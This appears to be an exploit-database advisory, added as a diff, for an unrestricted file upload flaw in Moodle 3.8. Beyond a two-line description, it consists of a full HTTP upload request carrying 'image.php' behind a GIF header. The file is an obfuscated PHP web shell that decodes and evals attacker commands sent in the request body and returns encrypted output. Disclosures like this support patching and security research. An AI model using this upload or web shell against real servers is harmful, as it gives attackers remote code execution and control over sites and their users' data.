@@ -1,0 +1,54 @@
+# Exploit Title: Moodle 3.8 - Unrestricted File Upload
+# Date: 2019-09-08
+# Exploit Author: Sirwan Veisi
+# Vendor Homepage: https://moodle.org/
+# Software Link: https://github.com/moodle/moodle
+# Version: Moodle Versions 3.8, 3.7, 3.6, 3.5, 3.4...
+# Tested on: Moodle Version 3.8
+# CWE : CWE-434
+
+I found an Unrestricted Upload vulnerability for Moodle version 3.8 , that
+allows the attacker to upload or transfer files of dangerous types.
+
+
+Example exploitation request:
+
+POST /repository/repository_ajax.php?action=upload HTTP/1.1
+Host: VulnerableHost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0)
+Gecko/20100101 Firefox/80.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data;
+boundary=---------------------------38898830537874132223151601680
+Content-Length: 2763
+Origin: https://VulnerableHost
+Connection: close
+Referer: https://VulnerableHost/user/files.php
+Cookie: MoodleSession=bpn90khjdh7mq4phs8i9r0caai
+Upgrade-Insecure-Requests: 1
+
+-----------------------------38898830537874132223151601680
+Content-Disposition: form-data; name="repo_upload_file";
+filename="image.php"
+Content-Type: image/jpeg
+
+GIF89a;
+<?php
+$Q=str_replace('kz','','crekzakztkze_kzfunckztkzion');
+$O='"";for%(%$i=%0;$i<$l;){for%($j=0%;($j<$c&%&$i<$l);$%j++,$i+%+%){$o.=$%t{$i';
+$l='_contents(%"php:%//input"),%$m)=%=1){@ob%_start();%@eva%l(@gzunc%o%mpress(%@';
+$C='$k="3%fbd6%8c8"%;$kh="2a%e%7d638909f";$%kf%="60eb0ffaeb%1%7";$p="dP%FT1%';
+$h='x(@b%ase%6%4_decode($m[1%]),$k)));%$o=@o%b_get_conte%%nts();@ob_end%%_c%lean';
+$N='}%%^$k{$j};}}retu%rn
+$o;}i%f(@preg%_matc%%h("/$kh(.+)$%%k%f%/",@file_ge%t';
+$e='Nmy694Bcj%Vc";fu%nction%
+x(%$t,$k){$c=st%rle%n%($%%k);$l=strlen($t)%;$o=';
+$V='();$r=@bas%e64_en%cod%e(@x(@%%gzcomp%ress($o),$k))%;%print("$%p$kh$r$kf");}';
+$P=str_replace('%','',$C.$e.$O.$N.$l.$h.$V);
+$n=$Q('',$P);$n();
+?>
+
+-----------------------------
